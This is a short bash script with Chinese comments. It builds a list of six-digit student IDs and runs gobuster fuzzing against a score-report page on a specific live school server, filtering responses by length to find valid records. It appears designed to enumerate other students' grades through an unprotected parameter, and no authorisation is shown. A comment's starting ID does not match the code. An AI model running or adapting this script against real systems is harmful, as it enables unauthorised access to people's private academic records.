#!/bin/bash

# 1. 產生學號字典檔 (從 8267 到 1000000)
# 使用 Python 快速產生，補零至 6 位數
echo "正在產生學號列表 (ids.txt)..."
python3 -c 'for i in range(10421, 1000001): print(str(i).zfill(6))' > ids.txt

echo "開始掃描..."
echo "目標: 找出長度不為 9870 (failed.html) 的頁面"
echo "為了保護伺服器，設定延遲 2 秒且單執行緒 (這會跑很久)"

# 2. 執行 Gobuster Fuzz 模式
# -u: 目標網址 (FUZZ 為替換關鍵字)
# -w: 剛剛產生的字典檔
# --exclude-length: 排除無效頁面的長度 (9870 ± 50)
# --excludestatuscodes: 忽略 500 錯誤
# -t 1: 單線程 (重要！)
# --delay 2s: 每個請求延遲 2 秒 (重要！)
# -v: 顯示詳細資訊

gobuster fuzz -u "http://163.16.246.199/s11/reg/score/20251124.asp?ID1=1420622&ID2=FUZZ" -w ids.txt --exclude-length 9820-9920 --excludestatuscodes 500 -t 1 --delay 2s

# 掃描結束後刪除暫存字典
# rm ids.txt
